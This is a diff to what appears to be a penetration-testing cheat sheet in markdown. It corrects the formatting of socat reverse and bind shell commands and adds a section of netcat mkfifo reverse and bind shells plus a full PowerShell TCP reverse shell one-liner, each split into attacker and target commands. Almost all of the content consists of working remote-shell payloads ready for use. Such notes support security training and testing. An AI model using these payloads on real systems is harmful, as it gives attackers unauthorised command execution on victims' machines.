@@ -57,7 +57,7 @@ We can force the remote server to either send us command line access to the serv
  On the attacking machine:
  `socat TCP-L:<port> -`
  
- On the target machine:
+ On the target machine: \
  `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` (for Linux target) \
  `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (for Windows target)
  
@@ -66,9 +66,9 @@ We can force the remote server to either send us command line access to the serv
  On the attacking machine:
  `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
  
- On tge target machine:
+ On tge target machine: \
  `socat TCP-L:<PORT> EXEC:"bash -li"` (for Linux target) \
- `socat TCP-L:<PORT> EXEC:powershell.exe,pipes` 
+ `socat TCP-L:<PORT> EXEC:powershell.exe,pipes` (for Windows target) 
  
  ### A fully stable Linux tty reverse shell
  
@@ -110,5 +110,22 @@ Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
 
 Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
  
+## Spceial Netcat Payload
 
- 
+### Reverse Shell
+
+Attacker: `netcat -nlvp <port>`
+
+Target: ```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` 
+
+### Bind Shell
+
+Attacker: `netcat <TARGET-IP> <PORT>`
+
+Target: ```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` (The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.)
+
+### Powershell Reverse Shell
+
+Attacker: `netcat -lnvp <PORT>`
+
+Target: ```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```
